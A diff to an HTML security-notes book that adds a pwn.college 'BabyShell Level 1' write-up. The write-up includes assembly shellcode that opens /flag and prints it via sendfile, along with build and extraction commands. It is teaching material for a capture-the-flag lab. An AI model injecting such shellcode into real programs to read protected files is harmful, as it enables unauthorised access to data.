@@ -76,7 +76,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.1.</strong> CVE-2015-3887</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.2.1.</strong> EmbryoASM Level 6</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.3.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">4.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">4.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">4.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">4.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">4.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.1.</strong> CVE-2015-3887</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.2.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.2.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.2.2.</strong> BabyShell Level 1</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.3.1.</strong> credchecker</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">4.1.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">4.2.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">4.3.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">4.4.</strong> RTL88x2bu Fake Access Point</a></li><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">4.5.</strong> Windows Cheatsheet</a></li></ol></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
         </nav>
@@ -425,6 +425,41 @@ _start:
     mov rbx, 0      ; zero out rbx
     mov bx, si      ; take the last 16 bits of rsi into last 16 bits of rbx
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-1"><a class="header" href="#babyshell-level-1">Babyshell Level 1</a></h1>
+<p>This is the first challenge of the shellcoding modules from pwn.college, it seems to me like a pretty simple challenge... however make sure to watch the videos on youtube before trying to complete those !</p>
+<h2 id="how-the-challenge-works"><a class="header" href="#how-the-challenge-works">How the challenge works</a></h2>
+<p>We are basically asked to &quot;inject position independant <strong>shell</strong>-code&quot;, we say position independant because the challenge base address change at every execution.</p>
+<p>From our knowledge, we know that most of the time flag is stored in &quot;/flag&quot;, this means we can write a shellcode to read and output us this file.</p>
+<p>I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read <a href="https://man7.org/tlpi/">The Linux Programming Interface</a> and <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/">Understanding the Linux Kernel, 3rd Edition</a>.</p>
+<p>We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on <strong>sys_open</strong>, <strong>sys_read</strong> and <strong>sys_exit</strong>.</p>
+<p>As it looks pretty obvious, we will first <strong>open</strong> the file (file descriptor), <strong>sendfile</strong> to read the content of that file and send its output to a file descriptor and then <strong>exit</strong> the program cleanly.</p>
+<h2 id="solving-the-challenge-1"><a class="header" href="#solving-the-challenge-1">Solving the Challenge</a></h2>
+<p>I think we're ready to start writing shellcode, for this we will write a <strong>.s</strong> (source) file, compile it with gcc (<strong>gcc -nostdlib -static solve.s solve</strong>) and extract the <strong>.text</strong> section code (our shellcode), into another file (<strong>objcopy --dump-section .text=shellcode solve</strong>).</p>
+<pre><code class="language-x86asm">.global _start
+_start:
+.intel_syntax noprefix
+    # Open file descriptor
+    mov rsi, 0                  # flags
+    lea rdi, [rip+flag]         # path name
+    mov rax, 2                  # syscall number (sys_open)
+    syscall                     # syscall (call into kernel)
+
+    # Read
+    mov rdi, 1                  # out_fd
+    mov rsi, rax                # in_fd
+    mov rdx, 0                  # offset
+    mov r10, 100                # count
+    mov rax, 40                 # syscall (sys_sendfile)
+    syscall                     # call into the kernel
+    
+    # Exit
+    mov rax, 60                 # syscall (sys_exit)
+    mov rdi, 42                 # exit number
+    syscall                     # syscall
+flag:
+    .ascii &quot;/flag\0&quot;
+</code></pre>
+<p>Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">Credchecker</a></h1>
 <p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
 <h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
